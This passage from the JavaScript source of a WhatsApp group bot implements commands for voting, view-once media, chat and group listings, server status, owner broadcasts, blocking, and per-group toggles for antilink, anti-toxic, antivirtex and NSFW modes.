          wasVote = isVote.includes(m.sender);
          if (wasVote) return replygcnhd("You have Voted");
          vote[m.chat][2].push(m.sender);
          menvote = vote[m.chat][1].concat(vote[m.chat][2]);
          teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`;
          NhdBotFunc.sendMessage(
            m.chat,
            { text: teks_vote, mentions: menvote },
            { quoted: m }
          );
        }
        break;

      case "checkvote":
        if (!m.isGroup) return NhdStickGroup();
        if (!(m.chat in vote))
          return replygcnhd(
            `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
          );
        teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

*${prefix}deletevote* - to delete votes


©${NhdBotFunc.user.id}
`;
        NhdBotFunc.sendTextWithMentions(m.chat, teks_vote, m);
        break;
      case "deletevote":
      case "delvote":
      case "hapusvote":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!(m.chat in vote))
            return replygcnhd(
              `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            );
          delete vote[m.chat];
          replygcnhd("Successfully Deleted Vote Session In This Group");
        }
        break;
      case "toonce":
      case "toviewonce":
        {
          if (!quoted) return replygcnhd(`Reply Image/Video`);
          await NhdStickWait();
          if (/image/.test(mime)) {
            anuan = await NhdBotFunc.downloadAndSaveMediaMessage(quoted);
            NhdBotFunc.sendMessage(
              m.chat,
              {
                image: { url: anuan },
                caption: `Here you go!`,
                fileLength: "999",
                viewOnce: true,
              },
              { quoted: m }
            );
          } else if (/video/.test(mime)) {
            anuanuan = await NhdBotFunc.downloadAndSaveMediaMessage(quoted);
            NhdBotFunc.sendMessage(
              m.chat,
              {
                video: { url: anuanuan },
                caption: `Here you go!`,
                fileLength: "99999999",
                viewOnce: true,
              },
              { quoted: m }
            );
          }
        }
        break;
      case "fliptext":
        {
          if (args.length < 1)
            return replygcnhd(`Example:\n${prefix}fliptext ${ownername}`);
          quere = args.join(" ");
          flipe = quere.split("").reverse().join("");
          replygcnhd(
            `\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`
          );
        }
        break;
      case "listpc":
        {
          let anulistp = await store.chats
            .all()
            .filter((v) => v.id.endsWith(".net"))
            .map((v) => v.id);
          let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`;
          for (let i of anulistp) {
            let nama = store.messages[i].array[0].pushName;
            teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${
              i.split("@")[0]
            }\n${themeemoji} *Chat :* https://wa.me/${
              i.split("@")[0]
            }\n\n────────────────────────\n\n`;
          }
          NhdBotFunc.sendTextWithMentions(m.chat, teks, m);
        }
        break;
      case "listgc":
        {
          let anulistg = await store.chats
            .all()
            .filter((v) => v.id.endsWith("@g.us"))
            .map((v) => v.id);
          let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`;
          for (let i of anulistg) {
            let metadata = await NhdBotFunc.groupMetadata(i);
            teks += `${themeemoji} *Name :* ${
              metadata.subject
            }\n${themeemoji} *Owner :* ${
              metadata.owner !== undefined
                ? "@" + metadata.owner.split`@`[0]
                : "Unknown"
            }\n${themeemoji} *ID :* ${
              metadata.id
            }\n${themeemoji} *Made :* ${moment(metadata.creation * 1000)
              .tz("Asia/Kolkata")
              .format("DD/MM/YYYY HH:mm:ss")}\n${themeemoji} *Member :* ${
              metadata.participants.length
            }\n\n────────────────────────\n\n`;
          }
          NhdBotFunc.sendTextWithMentions(m.chat, teks, m);
        }
        break;
      case "ping":
      case "botstatus":
        {
          const used = process.memoryUsage();
          const cpus = os.cpus().map((cpu) => {
            cpu.total = Object.keys(cpu.times).reduce(
              (last, type) => last + cpu.times[type],
              0
            );
            return cpu;
          });
          const cpu = cpus.reduce(
            (last, cpu, _, { length }) => {
              last.total += cpu.total;
              last.speed += cpu.speed / length;
              last.times.user += cpu.times.user;
              last.times.nice += cpu.times.nice;
              last.times.sys += cpu.times.sys;
              last.times.idle += cpu.times.idle;
              last.times.irq += cpu.times.irq;
              return last;
            },
            {
              speed: 0,
              total: 0,
              times: {
                user: 0,
                nice: 0,
                sys: 0,
                idle: 0,
                irq: 0,
              },
            }
          );
          let timestamp = speed();
          let latensi = speed() - timestamp;
          neww = performance.now();
          oldd = performance.now();
          respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${
            oldd - neww
          } _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used)
  .map(
    (key, _, arr) =>
      `${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
        used[key]
      )}`
  )
  .join("\n")}

${
  cpus[0]
    ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
        .map(
          (type) =>
            `- *${(type + "*").padEnd(6)}: ${(
              (100 * cpu.times[type]) /
              cpu.total
            ).toFixed(2)}%`
        )
        .join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
  .map(
    (cpu, i) =>
      `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
        cpu.times
      )
        .map(
          (type) =>
            `- *${(type + "*").padEnd(6)}: ${(
              (100 * cpu.times[type]) /
              cpu.total
            ).toFixed(2)}%`
        )
        .join("\n")}`
  )
  .join("\n\n")}`
    : ""
}
                `.trim();
          NhdBotFunc.relayMessage(
            m.chat,
            {
              requestPaymentMessage: {
                currencyCodeIso4217: "INR",
                amount1000: 999999999,
                requestFrom: m.sender,
                noteMessage: {
                  extendedTextMessage: {
                    text: respon,
                    contextInfo: {
                      externalAdReply: {
                        showAdAttribution: true,
                      },
                    },
                  },
                },
              },
            },
            {}
          );
        }

        break;
      case "ping2":
      case "botstatus2":
      case "statusbot2":
      case "p2":
        {
          const used = process.memoryUsage();
          const cpus = os.cpus().map((cpu) => {
            cpu.total = Object.keys(cpu.times).reduce(
              (last, type) => last + cpu.times[type],
              0
            );
            return cpu;
          });
          const cpu = cpus.reduce(
            (last, cpu, _, { length }) => {
              last.total += cpu.total;
              last.speed += cpu.speed / length;
              last.times.user += cpu.times.user;
              last.times.nice += cpu.times.nice;
              last.times.sys += cpu.times.sys;
              last.times.idle += cpu.times.idle;
              last.times.irq += cpu.times.irq;
              return last;
            },
            {
              speed: 0,
              total: 0,
              times: {
                user: 0,
                nice: 0,
                sys: 0,
                idle: 0,
                irq: 0,
              },
            }
          );
          let timestamp = speed();
          let latensi = speed() - timestamp;
          neww = performance.now();
          oldd = performance.now();
          respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${
            oldd - neww
          } _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used)
  .map(
    (key, _, arr) =>
      `${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
        used[key]
      )}`
  )
  .join("\n")}

${
  cpus[0]
    ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
        .map(
          (type) =>
            `- *${(type + "*").padEnd(6)}: ${(
              (100 * cpu.times[type]) /
              cpu.total
            ).toFixed(2)}%`
        )
        .join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
  .map(
    (cpu, i) =>
      `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
        cpu.times
      )
        .map(
          (type) =>
            `- *${(type + "*").padEnd(6)}: ${(
              (100 * cpu.times[type]) /
              cpu.total
            ).toFixed(2)}%`
        )
        .join("\n")}`
  )
  .join("\n\n")}`
    : ""
}
                `.trim();
          replygcnhd(respon);
        }
        break;
      case "bctext":
      case "broadcasttext":
      case "broadcast":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (!q) return replygcnhd(`Enter text`);
          const data = await store.chats.all();
          for (let i of data) {
            NhdBotFunc.sendMessage(i.id, {
              text: `${ownername}'s Broadcast\n\nMessage : ${q}`,
            });
            await sleep(1000);
          }
        }
        break;
      case "broadcastimage":
      case "bcimage":
      case "broadcastvideo":
      case "broadcastvid":
        if (!NhdTheCreator) return NhdStickOwner();
        if (!q) return replygcnhd(`Enter text`);
        let getGroups = await NhdBotFunc.groupFetchAllParticipating();
        let groups = Object.entries(getGroups)
          .slice(0)
          .map((entry) => entry[1]);
        let nhdcast = groups.map((v) => v.id);
        replygcnhd(
          ` Broadcasting in ${nhdcast.length} Group Chat, in ${
            nhdcast.length * 1.5
          } seconds`
        );
        for (let i of nhdcast) {
          let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`;
          if (/image/.test(mime)) {
            let media = await quoted.download();
            await NhdBotFunc.sendMessage(i, {
              image: media,
              caption: txt,
              mentions: participants.map((a) => a.id),
            });
          }
          if (/video/.test(mime)) {
            let media = await quoted.download();
            await NhdBotFunc.sendMessage(i, {
              video: media,
              caption: txt,
              mentions: participants.map((a) => a.id),
            });
          }
        }
        replygcnhd(`Successfuly Broadcasted in ${nhdcast.length} Groups`);
        break;
      case "block":
      case "ban":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await NhdBotFunc.updateBlockStatus(users, "block");
          await replygcnhd(`Done`);
        }
        break;
      case "unblock":
      case "unban":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await NhdBotFunc.updateBlockStatus(users, "unblock");
          await replygcnhd(`Done`);
        }
        break;
      case "listblock":
      case "listban":
      case "blocklist":
      case "banlist":
        {
          const lisben = "Total Block: " + banUser.length;
          replygcnhd(lisben);
        }
        break;
      case "afk":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!text)
            return replygcnhd(`Example ${prefix + command} want to sleep`);
          let user = global.db.users[m.sender];
          user.afkTime = +new Date();
          user.afkReason = args.join(" ");
          replygcnhd(
            `${m.pushName} Has Gone AFK\nReason : ${
              args.join(" ") ? args.join(" ") : ""
            }`
          );
        }
        break;
      case "resetlinkgc":
      case "resetlinkgroup":
      case "resetlinkgrup":
      case "revoke":
      case "resetlink":
      case "resetgrouplink":
      case "resetgclink":
      case "resetgruplink":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          NhdBotFunc.groupRevokeInvite(m.chat);
        }
        break;
      case "react":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          reactionMessage = {
            react: {
              text: args[0],
              key: { remoteJid: m.chat, fromMe: true, id: quoted.id },
            },
          };
          NhdBotFunc.sendMessage(m.chat, reactionMessage);
        }
        break;
      case "group":
      case "editinfo":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!q)
            return replygcnhd(
              `Send orders ${command} _options_\nOptions : close & open\nExample : ${command} close`
            );
          if (args[0] == "close") {
            NhdBotFunc.groupSettingUpdate(from, "announcement");
            replygcnhd(
              `Success Allows Only Admins To Send Messages To This Group`
            );
          } else if (args[0] == "open") {
            NhdBotFunc.groupSettingUpdate(from, "not_announcement");
            replygcnhd(
              `Success Allows All Participants To Send Messages To This Group`
            );
          } else {
            replygcnhd(
              `Type Command ${command} _pptions_\nOptions : Close & Open\nExample : ${command} close`
            );
          }
        }
        break;
      case "autostickergc":
      case "autosticker":
        if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
        if (args.length < 1)
          return replygcnhd(
            "type auto sticker on to enable\ntype auto sticker off to disable"
          );
        if (args[0] === "on") {
          if (isAutoSticker) return replygcnhd(`Already activated`);
          autosticker.push(from);
          fs.writeFileSync(
            "./database/autosticker.json",
            JSON.stringify(autosticker)
          );
          replygcnhd("autosticker activated");
        } else if (args[0] === "off") {
          let anuticker1 = autosticker.indexOf(from);
          autosticker.splice(anuticker1, 1);
          fs.writeFileSync(
            "./database/autosticker.json",
            JSON.stringify(autosticker)
          );
          replygcnhd("auto sticker deactivated");
        }
        break;
      case "antivirus":
      case "antivirtex":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (args[0] === "on") {
            if (antiVirtex) return replygcnhd("Already activated");
            ntvirtex.push(from);
            fs.writeFileSync(
              "./database/antivirus.json",
              JSON.stringify(ntvirtex)
            );
            replygcnhd("Success in turning on antivirus in this group");
            var groupe = await NhdBotFunc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            NhdBotFunc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!antiVirtex) return replygcnhd("Already deactivated");
            let off = ntvirtex.indexOf(from);
            ntvirtex.splice(off, 1);
            fs.writeFileSync(
              "./database/antivirus.json",
              JSON.stringify(ntvirtex)
            );
            replygcnhd("Success in turning off antivirus this group");
          } else {
            await replygcnhd(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "nsfw":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (args[0] === "on") {
            if (AntiNsfw) return replygcnhd("Already activated");
            ntnsfw.push(from);
            fs.writeFileSync("./database/nsfw.json", JSON.stringify(ntnsfw));
            replygcnhd("Success in turning on nsfw in this group");
            var groupe = await NhdBotFunc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            NhdBotFunc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiNsfw) return replygcnhd("Already deactivated");
            let off = ntnsfw.indexOf(from);
            ntnsfw.splice(off, 1);
            fs.writeFileSync("./database/nsfw.json", JSON.stringify(ntnsfw));
            replygcnhd("Success in turning off nsfw in this group");
          } else {
            await replygcnhd(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinkyoutubevideo":
      case "antilinkyoutubevid":
      case "antilinkytvid":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (args[0] === "on") {
            if (AntiLinkYoutubeVid) return replygcnhd("Already activated");
            ntilinkytvid.push(from);
            fs.writeFileSync(
              "./database/antilinkytvideo.json",
              JSON.stringify(ntilinkytvid)
            );
            replygcnhd(
              "Success in turning on youtube video antilink in this group"
            );
            var groupe = await NhdBotFunc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            NhdBotFunc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkYoutubeVid) return replygcnhd("Already deactivated");
            let off = ntilinkytvid.indexOf(from);
            ntilinkytvid.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinkytvideo.json",
              JSON.stringify(ntilinkytvid)
            );
            replygcnhd(
              "Success in turning off youtube video antilink in this group"
            );
          } else {
            await replygcnhd(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinkyoutubech":
      case "antilinkyoutubechannel":
      case "antilinkytch":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (args[0] === "on") {
            if (AntiLinkYoutubeChannel) return replygcnhd("Already activated");
            ntilinkytch.push(from);
            fs.writeFileSync(
              "./database/antilinkytchannel.json",
              JSON.stringify(ntilinkytch)
            );
            replygcnhd(
              "Success in turning on youtube channel antilink in this group"
            );
            var groupe = await NhdBotFunc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            NhdBotFunc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkYoutubeChannel)
              return replygcnhd("Already deactivated");
            let off = ntilinkytch.indexOf(from);
            fs.writeFileSync(
              "./database/antilinkytchannel.json",
              JSON.stringify(ntilinkytch)
            );
            ntilinkytch.splice(off, 1);
            replygcnhd(
              "Success in turning off youtube channel antilink in this group"
            );
          } else {
            await replygcnhd(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinkinstagram":
      case "antilinkig":
      case "antilinkinsta":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (args[0] === "on") {
            if (AntiLinkInstagram) return replygcnhd("Already activated");
            ntilinkig.push(from);
            fs.writeFileSync(
              "./database/antilinkinstagram.json",
              JSON.stringify(ntilinkig)
            );
            replygcnhd(
              "Success in turning on instagram antilink in this group"
            );
            var groupe = await NhdBotFunc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            NhdBotFunc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkInstagram) return replygcnhd("Already deactivated");
            let off = ntilinkig.indexOf(from);
            ntilinkig.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinkinstagram.json",
              JSON.stringify(ntilinkig)
            );
            replygcnhd(
              "Success in turning off instagram antilink in this group"
            );
          } else {
            await replygcnhd(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinkfacebook":
      case "antilinkfb":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (args[0] === "on") {
            if (AntiLinkFacebook) return replygcnhd("Already activated");
            ntilinkfb.push(from);
            fs.writeFileSync(
              "./database/antilinkfacebook.json",
              JSON.stringify(ntilinkfb)
            );
            replygcnhd("Success in turning on facebook antilink in this group");
            var groupe = await NhdBotFunc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            NhdBotFunc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkFacebook) return replygcnhd("Already deactivated");
            let off = ntilinkfb.indexOf(from);
            ntilinkfb.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinkfacebook.json",
              JSON.stringify(ntilinkfb)
            );
            replygcnhd(
              "Success in turning off facebook antilink in this group"
            );
          } else {
            await replygcnhd(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinktelegram":
      case "antilinktg":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (args[0] === "on") {
            if (AntiLinkTelegram) return replygcnhd("Already activated");
            ntilinktg.push(from);
            fs.writeFileSync(
              "./database/antilinktelegram.json",
              JSON.stringify(ntilinktg)
            );
            replygcnhd("Success in turning on telegram antilink in this group");
            var groupe = await NhdBotFunc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            NhdBotFunc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkTelegram) return replygcnhd("Already deactivated");
            let off = ntilinktg.indexOf(from);
            ntilinktg.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinktelegram.json",
              JSON.stringify(ntilinktg)
            );
            replygcnhd(
              "Success in turning off telegram antilink in this group"
            );
          } else {
            await replygcnhd(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinktiktok":
      case "antilinktt":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (args[0] === "on") {
            if (AntiLinkTiktok) return replygcnhd("Already activated");
            ntilinktt.push(from);
            fs.writeFileSync(
              "./database/antilinktiktok.json",
              JSON.stringify(ntilinktt)
            );
            replygcnhd("Success in turning on tiktok antilink in this group");
            var groupe = await NhdBotFunc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            NhdBotFunc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkTiktok) return replygcnhd("Already deactivated");
            let off = ntilinktt.indexOf(from);
            ntilinktt.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinktiktok.json",
              JSON.stringify(ntilinktt)
            );
            replygcnhd("Success in turning off tiktok antilink in this group");
          } else {
            await replygcnhd(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinktwt":
      case "antilinktwitter":
      case "antilinktwit":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (args[0] === "on") {
            if (AntiLinkTwitter) return replygcnhd("Already activated");
            ntilinktwt.push(from);
            fs.writeFileSync(
              "./database/antilinktwitter.json",
              JSON.stringify(ntilinktwt)
            );
            replygcnhd("Success in turning on twitter antilink in this group");
            var groupe = await NhdBotFunc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            NhdBotFunc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkTwitter) return replygcnhd("Already deactivated");
            let off = ntilinktwt.indexOf(from);
            ntilinktwt.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinktwitter.json",
              JSON.stringify(ntilinktwt)
            );
            replygcnhd("Success in turning off twitter antilink in this group");
          } else {
            await replygcnhd(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinkall":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (args[0] === "on") {
            if (AntiLinkTwitter) return replygcnhd("Already activated");
            ntilinkall.push(from);
            fs.writeFileSync(
              "./database/antilinkall.json",
              JSON.stringify(ntilinkall)
            );
            replygcnhd("Success in turning on all antilink in this group");
            var groupe = await NhdBotFunc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            NhdBotFunc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkAll) return replygcnhd("Already deactivated");
            let off = ntilinkall.indexOf(from);
            ntilinkall.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinkall.json",
              JSON.stringify(ntilinkall)
            );
            replygcnhd("Success in turning off all antilink in this group");
          } else {
            await replygcnhd(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antitoxic":
      case "antibadword":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (args[0] === "on") {
            if (antiToxic) return replygcnhd("Already activated");
            nttoxic.push(from);
            fs.writeFileSync(
              "./database/antitoxic.json",
              JSON.stringify(nttoxic)
            );
            replygcnhd("Success in turning on antitoxic in this group");
            var groupe = await NhdBotFunc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            NhdBotFunc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!antiToxic) return replygcnhd("Already deactivated");
            let off = nttoxic.indexOf(from);
            nttoxic.splice(off, 1);
            fs.writeFileSync(
              "./database/antitoxic.json",
              JSON.stringify(nttoxic)
            );
            replygcnhd("Success in turning off antitoxic in this group");
          } else {
            await replygcnhd(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antiwame":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!isAdmins && !NhdTheCreator) return NhdStickAdmin();
          if (args[0] === "on") {
            if (antiWame) return replygcnhd("Already activated");
            ntwame.push(from);
            fs.writeFileSync(
              "./database/antiwame.json",
              JSON.stringify(ntwame)
            );
            replygcnhd("Success in turning on antiwame in this group");
            var groupe = await NhdBotFunc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            NhdBotFunc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!antiWame) return replygcnhd("Already deactivated");
